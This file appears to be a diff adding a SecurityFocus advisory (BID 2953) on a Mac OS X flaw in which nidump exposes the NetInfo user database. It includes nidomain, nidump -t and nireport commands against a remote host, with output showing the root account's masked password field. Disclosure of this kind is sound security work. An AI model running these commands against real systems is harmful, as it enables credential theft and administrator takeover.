@@ -1,0 +1,52 @@
+source: http://www.securityfocus.com/bid/2953/info
+
+A vulnerability exists in all versions of Apple MacOS X.
+
+It has been found to contain a vulnerability which could allow disclosure of passwords and other sensitive system information.
+
+nidump is a Mac OS X system data extraction utility which can be used to read the contents of the NetInfo database. This utility's default file permissions leave this utility available to any local user at the command line.
+
+However, hosts with a network nidomain may be vulnerable to remote exploitation of this issue. This is possible if remote tags are used for nidump. It should also be noted that both portmap and netinfobind must be listening on the target host for this issue to be exploited.
+
+The output of the nidump command can reveal the list of usernames and passwords in clear text. An attacker could then use this list to log in as a user with administrative priveleges. 
+
+% nidomain -l xxx.xxx.net
+tag=network udp=797 tcp=798
+tag=local udp=795 tcp=796
+
+% nidump -t xxx.xxx.net/network passwd
+root:xxxxxxxx.:0:0::0:0:System Administrator:/private/var/root:/bin/tcsh
+
+% nireport -t xxx.xxx.net/network /users name uid
+passwd
+root 0 xxxxxxxxx.
+
+% nidump -r / -t xxx.xxxx.net/network
+{
+"master" = ( "localhost/network" );
+CHILDREN = (
+{
+"name" = ( "machines" );
+CHILDREN = (
+{
+"name" = ( "localhost" );
+"ip_address" = ( "xxx.xxx.xxx.xxx" );
+"serves" = ( "./network", "localhost/local" );
+}
+)
+},
+{
+"name" = ( "users" );
+CHILDREN = (
+{
+"name" = ( "root" );
+"passwd" = ( "xxxxxxxxx." );
+"uid" = ( "0" );
+"gid" = ( "0" );
+"change" = ( "0" );
+"expire" = ( "0" );
+"realname" = ( "System Administrator" );
+"home" = ( "/private/var/root" );
+"shell" = ( "/bin/tcsh" );
+}
+etc. 
